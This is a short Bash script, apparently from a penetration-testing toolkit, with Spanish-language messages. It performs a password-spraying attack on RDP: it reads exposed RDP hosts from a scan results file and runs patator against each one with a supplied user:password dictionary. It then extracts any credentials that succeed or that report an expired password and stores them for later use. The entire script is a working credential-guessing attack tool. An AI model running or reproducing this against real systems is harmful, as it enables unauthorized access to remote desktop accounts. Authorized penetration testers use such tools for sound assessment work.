#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

OKBLUE='\033[94m'
THREADS="30"
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'

max_ins=10

echo 'PASSWORD SPRAY'
echo '										version 1.0'
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"



while getopts ":d:" OPTIONS
do
            case $OPTIONS in            
            d)     DICTIONARY=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

DICTIONARY=${DICTIONARY:=NULL}

if [ ${DICTIONARY} = NULL ];then 

cat << "EOF"

Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)

Ejemplo 2: Ataque de diccionario con lista de passwords
	spray.sh -d creds.txt 
EOF

exit
fi
######################


function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
	insert-data.py	
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}




if [ -f servicios/rdp.txt ]; then	
	for line in $(cat servicios/rdp.txt); do			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
			
		patator.py rdp_login host=$ip user=COMBO00 password=COMBO01 0=$DICTIONARY -x quit:egrep='OK|PASSWORD_EXPIRED' 2> logs/cracking/"$ip"_rdp_passwordReuse.txt
		egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_rdp_passwordReuse.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then	
			echo -e "\t$OKRED[!] Password found \n $RESET"
			creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK"  logs/cracking/"$ip"_rdp_passwordReuse.txt | awk '{print $9}'`
			echo "$creds" >> .vulnerabilidades/"$ip"_rdp_passwordReuse.txt
		fi							
	 done	
	 insert_data

fi

